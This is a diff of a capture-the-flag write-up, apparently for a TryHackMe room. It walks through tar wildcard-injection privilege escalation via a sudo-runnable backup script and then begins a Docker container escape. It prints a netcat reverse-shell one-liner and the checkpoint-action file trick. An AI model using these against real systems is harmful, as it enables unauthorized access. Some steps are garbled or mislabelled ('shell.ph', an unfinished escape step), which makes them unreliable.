@@ -275,17 +275,21 @@ Let's check if user `jake` have any SUDO privileges:
 
 ![sudo-l](sudo-list.png)
 
-It seems that `jake`, can run the `/opt/backups/backup.sh` file with the perimissions of user `michael`, who is its owner. Upon closer inspection of the file's contents, we can see that this executable is vulnerable to **wildcard injection**. 
+It seems that `jake`, can run the `/opt/backups/backup.sh` file with the perimissions of user `michael`, who is its owner. Upon closer inspection of the file's contents, its job seems pretty straightforward:
 
 ![backup-sh-script](backup-sh.png)
 
-Feel free to read this amazing [*Exploiting Wildcard for Privilege Escalation*](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/) article to fully grasp the concept of the **wildcard injection**. The gist is that we are trying to exploit a vulnerability in a specific software or utility, `tar`, that processes files with specific flags, `--checkpoint-action`, in order to gain unauthorized access to a remote machine by executing arbitrary code, the `shell.sh` script.
-
-This is what `backup.sh` does:
 1. It creates a **tar archive** named `backup.tar`, using the `tar cf /opt/backups/backup.tar` command.
 2. Instead of archiving a specified file, for instance, `tar cf /opt/backups/backup.tar backup.sh`, it uses the wildcard character, `*`, which means that it is archiving all files within the directory.
 
-And here is how we can perform a **wildcard injection**:
+This is where things got dark really fast. I spent an awful lot of time researching and reading for this one, I even asked [ChatGPT](https://chat.openai.com/) 🤖, but I couldn't completely grasp what the concept of [**wildcard injection**](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/). What finally did it for me was [Tib3rius](https://tryhackme.com/p/Tib3rius)' [walkthrough](https://youtu.be/EYqCHujNyHQ?t=2662)!
+
+The gist of what I understood based on the above walkthrough is that we are trying to take advantage of the [**wildcard wildness**](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/) concept by passing files as command arguments. As Tib3rius explains:
+
+> An `*` in Bash will take the names of all the files in current directory and it will concatenate them using spaces. And it just so happens that arguments to executables are separated by spaces too. So, if you ever have an `*` after a command, and one of the files in the current directory just happens to very closely resemble an argument for that command
+, you can execute that command and pass the files as arguments!
+
+Armed with Tib3rius explanation and GTFO's guidance on how to exploit [tar](https://gtfobins.github.io/gtfobins/tar/#sudo), this is how to do it:
 
 1. Generate a payload with `msfvenom`:
 
@@ -307,26 +311,29 @@ And here is how we can perform a **wildcard injection**:
     echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.2.3.202 9001 >/tmp/f" > shell.sh
     ```
 
-4. Create a file named `--checkpoint-action=exec=sh shell.sh`, which is designed to trick the system as it uses the `--checkpoint-action` flag.
-In this context, it's used to execute the `shell.ph` script when a checkpoint occurs.
+4. Now, create a second file resembling the `--checkpoint=1` argument, which defines the point that the checkpoint is reached:
 
     ```bash
-    echo "" > "--checkpoint-action=exec=sh shell.sh"
-    ```
-
-5. Create a file named `--checkpoint=1` with the purpose of triggering the above checkpoint.
-
-    ```bash
+    touch /.--checkpoint=1
+    # or
     echo "" > --checkpoint=1
     ```
 
-6. Modify permissions to make the files executable.
+5. Finally, create another file resembling the `--checkpoint-action=exec=` argument, which defines what `ACTION` will be executed when the checkpoint is reached, pointing to where our payload `shell.ph`:
+
+    ```bash
+    touch ./--checkpoint-action=exec=sh shell.sh
+    # or
+    echo "" > "--checkpoint-action=exec=sh shell.sh"
+    ```
+
+6. Modify permissions to make the files executable:
 
     ```bash
     chmod 777 backup.tar shell.sh
     ```
 
-7. Run `backup.sh` as user `michael`, which will 
+7. Run `backup.sh` as user `michael`. Once `backup.sh` is ran, the checkpoint will be reached, and as a result our `shell.ph` will be run: 
 
     ```bash
     sudo -u michael /opt/backups/backup.sh
@@ -334,10 +341,22 @@ In this context, it's used to execute the `shell.ph` script when a checkpoint oc
 
 ![michael-shell](michael-shell.png)
 
+We did it 🎉! Thanks Tib3rius!
 
 ### 3.4 Container Escape
 
-Create a new container from image `alpine`, mount the root filesystem to `/mnt`, start the container in interactive mode which will give us a shell to work with, change the root to `/mnt` and delete the container upon exiting:
+The output of the `id` command we executed before, included `999(docker)`, which let us know that we are within a container. We have performed a container escape at the [Dogcat](https://cspanias.github.io/posts/Dogcat-Write-Up/#35-container-escape) room, so let's try to escape again 🏃!
+
+1. List the docker images:
+
+    ```bash
+    docker image ls
+    ```
+1. Create a new container from image `alpine` (the "Dockerized" version of Alpine Linux) by mounting the root filesystem to `/mnt`, while starting in interctive mode (`-it`). 
+
+
+
+2. , start the container in interactive mode which will give us a shell to work with, change the root to `/mnt` and delete the container upon exiting:
 
 ![flag-3](flag-3.jpg)
 
